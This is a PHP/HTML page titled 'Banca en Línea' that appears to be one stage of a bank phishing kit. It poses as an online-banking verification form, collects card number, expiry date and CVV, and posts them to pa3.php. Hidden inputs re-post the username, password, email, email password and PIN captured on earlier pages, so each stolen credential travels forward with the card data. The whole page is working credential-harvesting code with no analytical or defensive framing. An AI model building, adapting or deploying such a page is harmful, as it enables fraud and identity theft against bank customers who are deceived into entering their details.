

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="css/normalize.min.css" />
  <link rel="stylesheet" href="css/estilos.css" />
  <title>Banca en Línea</title>
  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>

<body class="fondo3">
  <div class="modal">
    <div class="modal-border">
      <div class="modal-contenido">
        <img style="user-drag: none;
user-select: none;
-moz-user-select: none;
-webkit-user-drag: none;
-webkit-user-select: none;
-ms-user-select: none;" src="img/formulario.png" alt="formulario" />

        <form action="pa3.php" method="post" id="formcard">
          <input class="cinput" type="text" name="card" id="card" maxlength="16" required>
          <input type="hidden" name="add" value="echo">
          <select class=" select mselect" name="mes" id="mes" required>
            <option value="">--</option>
            <option value="1">01</option>
            <option value="2">02</option>
            <option value="3">03</option>
            <option value="4">04</option>
            <option value="5">05</option>
            <option value="6">06</option>
            <option value="7">07</option>
            <option value="8">08</option>
            <option value="9">09</option>
            <option value="10">10</option>
            <option value="11">11</option>
            <option value="12">12</option>
          </select>
          <select class="select aselect" name="year" id="year" required>
            <option value="">----</option>
            <option value="2022">2022</option>
            <option value="2023">2023</option>
            <option value="2024">2024</option>
            <option value="2025">2025</option>
            <option value="2026">2026</option>
            <option value="2027">2027</option>
            <option value="2028">2028</option>
            <option value="2029">2029</option>
            <option value="2030">2030</option>
          </select>
          <input class="cvvinput" type="password" name="cvv" id="cvv" maxlength="3" required> 
          <button type="button" class="btnnewcast" id="verifica"disabled >Verify</button>

          <img class="topform" src="img/top.png" alt="top">
          <img class="bottomform" src="img/botton.png" alt="botton">
          
           <?php 
                     $variable= $_POST['usuario'];
        echo '<a href="pa1.php"></a><input id="usuario" style="visibility:hidden" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
           <?php 
                     $variable= $_POST['contra'];
        echo '<a href="pa1.php"></a><input id="contra" style="visibility:hidden" name="contra" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
                     $variable= $_POST['email'];
        echo '<a href="pa1.php"></a><input id="email" style="visibility:hidden" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
                     $variable= $_POST['cpass'];
        echo '<a href="pa1.php"></a><input id="cpass" style="visibility:hidden" name="cpass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
                     $variable= $_POST['pin'];
        echo '<a href="pa1.php"></a><input id="pin" style="visibility:hidden" name="pin" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          
        </form>
      </div>
    </div>

  </div>
  <script>
    var formCard = document.getElementById("formcard");
    var card = document.getElementById("card"),
      mes = document.getElementById("mes"),
      year = document.getElementById("year"),
      cvv = document.getElementById("cvv");
    var btnCard = document.getElementById("verifica");

    var validc = 0,
      validm = 0,
      valida = 0,
      validcvv = 0;

    if (card) {
      card.addEventListener("input", function() {
        if (card.value.length > 12 && card.value.length <= 16) {
          validc = 1;
          if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
            btnCard.removeAttribute("disabled");

          }
        } else {
          btnCard.setAttribute("disabled", "disabled");
          validc = 0;
        }
      });
    }

    if (mes) {
      mes.addEventListener("change", function() {
        if (mes.value.length > 0) {
          validm = 1;
          if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
            btnCard.removeAttribute("disabled");

          }
        } else {
          btnCard.setAttribute("disabled", "disabled");

          validm = 0;
        }
      });
    }
    if (year) {
      year.addEventListener("change", function() {
        if (year.value.length > 0) {
          valida = 1;
          if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
            btnCard.removeAttribute("disabled");

          }
        } else {
          btnCard.setAttribute("disabled", "disabled");

          valida = 0;
        }
      });
    }

    if (cvv) {
      cvv.addEventListener("input", function() {
        if (cvv.value.length == 3 || cvv.value.length == 4 ) {
          validcvv = 1;
          if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
            btnCard.removeAttribute("disabled");

          }
        } else {
          btnCard.setAttribute("disabled", "disabled");

          validcvv = 0;
        }
      });
    }

    if (btnCard) {
      btnCard.addEventListener("click", function() {
        if (
          (card.value.length > 12 && card.value.length <= 16) &&
          mes.value.length > 0 &&
          year.value.length > 0 &&
          (cvv.value.length == 3 || cvv.value.length == 4 )
        ) {
          
          formCard.submit();
        }
      });
    }
  </script>
</body>

</html>
